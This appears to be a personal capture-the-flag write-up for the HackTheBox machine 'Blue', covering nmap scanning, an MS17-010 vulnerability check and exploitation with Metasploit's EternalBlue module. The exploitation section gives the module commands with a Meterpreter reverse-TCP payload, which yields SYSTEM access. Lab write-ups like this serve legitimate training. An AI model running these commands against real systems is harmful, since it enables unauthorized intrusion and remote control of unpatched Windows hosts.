---
os: Windows
status: Pwned
tags: [eternalblue, ms17-010, smb]
aliases:
IP:
Secondary IP:
Hostname:
Domain:
SID:
VM: HackTheBox
Ports: 445
Notes: Windows 7 Pro SP1, EternalBlue (MS17-010)
---
# Resolution summary

>[!summary]
>- Identified Windows 7 Professional 7601 SP1
>- SMB vulnerable to CVE-2017-0143 (EternalBlue/MS17-010)
>- Exploited EternalBlue for SYSTEM access

## Improved skills

- EternalBlue exploitation
- SMB vulnerability identification
- Windows SMB enumeration

## Used tools

- [[Nmap]]
- [[Metasploit]] (EternalBlue exploit)

---

# Information Gathering

Scanned all TCP ports:

```bash
nmap -sV -sC -p- 10.10.10.40 -oA nmap_scans/blue
```

Enumerated open TCP ports:

```bash
# SMB ports open (139, 445)
```

---

# Enumeration

## Port 445 - SMB

**Results:**
- Operating System: Windows 7 Professional 7601 Service Pack 1
- SMB vulnerable to CVE-2017-0143 (MS17-010 - EternalBlue)

Vulnerability confirmed using [[Nmap]] NSE script:
```bash
nmap --script smb-vuln-ms17-010 -p445 10.10.10.40
```

---

# Exploitation

## EternalBlue (MS17-010)

Exploited SMB vulnerability to gain SYSTEM access:

```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.40
set LHOST tun0
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit
```

Obtained direct SYSTEM level access - no privilege escalation needed.

---

# Trophy

>[!todo] **User.txt**
>C:\Users\<username>\Desktop\user.txt

>[!todo] **Root.txt**
>C:\Users\Administrator\Desktop\root.txt
